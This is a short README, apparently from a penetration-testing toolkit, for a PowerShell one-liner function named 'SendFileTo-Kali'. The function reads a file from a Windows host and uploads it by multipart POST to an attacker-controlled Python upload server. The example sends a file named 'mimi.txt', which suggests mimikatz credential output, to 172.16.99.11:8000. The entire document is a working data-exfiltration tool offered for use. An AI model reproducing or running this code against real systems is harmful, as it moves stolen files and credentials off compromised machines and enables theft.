# USAGE
```
SendFileTo-Kali -FilePath <abosolute_path> -UploadUrl <python3 http server with upload url>
```
Oneliner ps1
``` powershell
function SendFileTo-Kali{param([Parameter(Mandatory=$true)][string]$FilePath,[Parameter(Mandatory=$true)][string]$UploadUrl);Write-Host "Sending File: $FilePath to $UploadUrl";try{$boundary=[guid]::NewGuid().ToString();$contentType="multipart/form-data; boundary=$boundary";$fileBytes=[System.IO.File]::ReadAllBytes($FilePath);$body=[System.Text.StringBuilder]::new();$null=$body.AppendLine("--$boundary");$null=$body.AppendLine(('Content-Disposition: form-data; name="file"; filename="{0}"' -f (Split-Path $FilePath -Leaf)));$null=$body.AppendLine('Content-Type: application/octet-stream');$null=$body.AppendLine();$null=$body.Append([System.Text.Encoding]::Default.GetString($fileBytes));$null=$body.AppendLine();$null=$body.AppendLine("--$boundary--");$bodyBytes=[System.Text.Encoding]::Default.GetBytes($body.ToString());$request=[System.Net.HttpWebRequest]::Create($UploadUrl);$request.Method="POST";$request.ContentType=$contentType;$request.ContentLength=$bodyBytes.Length;$rs=$request.GetRequestStream();$rs.Write($bodyBytes,0,$bodyBytes.Length);$rs.Close();$response=$request.GetResponse();return $response}catch{Write-Error "Error sending file: $_"}}

```

### Example
```
SendFileTo-Kali -FilePath "C:\Program Files\temp\mimi.txt" -UploadUrl "http://172.16.99.11:8000/"
```
